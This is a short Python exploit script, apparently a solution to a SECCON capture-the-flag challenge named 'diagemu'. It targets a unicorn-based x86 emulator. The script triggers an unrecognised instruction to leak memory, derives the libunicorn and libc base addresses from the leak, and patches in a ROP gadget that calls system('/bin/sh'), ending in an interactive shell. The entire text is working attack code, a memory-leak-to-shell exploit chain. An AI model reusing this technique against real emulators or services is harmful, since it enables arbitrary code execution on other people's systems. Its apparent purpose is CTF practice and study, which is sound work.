from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9001"))

code = nasm("""
xend    ; instruction not recognized by unicorn
db 0x41, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42
""", bits=64)

libc = ELF("./libc.so.6")
libunicorn = ELF("../files/diagemu/bin/libunicorn.so.2")
sock = Process("../files/diagemu/bin/diagemu",
               env={"LD_LIBRARY_PATH": "../distfiles/"})
#sock = Socket(HOST, PORT)

sock.sendafter(": ", str(len(code)))
sock.sendafter(": ", code)
sock.recvuntil("insn: ")
leak = b''
for i in range(0xf1f1):
    leak += bytes.fromhex(sock.recvregex("[0-9a-f]{2}").decode())
libunicorn_base = u64(leak[0xa8:0xb0]) - libunicorn.symbol('x86_reg_read_x86_64')
libunicorn.base = libunicorn_base
libc.base = libunicorn.base - 0x228000

do_system = libc.base + 0x508f0
rop_mov_rdi_praxP648h_call_praxP640h = libc.base + 0x00094b36
payload = leak[:0xb0] + p64(rop_mov_rdi_praxP648h_call_praxP640h) + leak[0xb8:]
payload = payload[:0x20+0x640] + p64(do_system+2) + p64(next(libc.find("/bin/sh"))) + payload[0x20+0x650:]
sock.sendafter("Patch: ", payload)

sock.sh()
